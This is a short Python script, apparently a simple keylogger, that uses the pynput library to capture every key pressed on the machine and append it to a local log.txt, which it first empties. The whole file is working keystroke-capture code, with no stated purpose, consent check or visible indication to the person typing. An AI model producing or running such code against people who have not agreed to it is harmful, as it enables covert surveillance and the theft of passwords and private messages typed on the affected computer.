from pynput.keyboard import Listener

#Erases previous content of log.txt:
with open("log.txt",'w') as f:
    f.truncate()

def key_pressed(key):
    key=str(key).replace("'","")
    if key=='Key.space':
        key=" "
    if key=='Key.shift':
        key=""
    if key=='Key.enter':
        key="\n"
    if key=='Key.backspace':
        key=""
    
    with open("log.txt",'a') as f:
        f.write(key)



with Listener(on_press=key_pressed) as l:
    l.join()
    

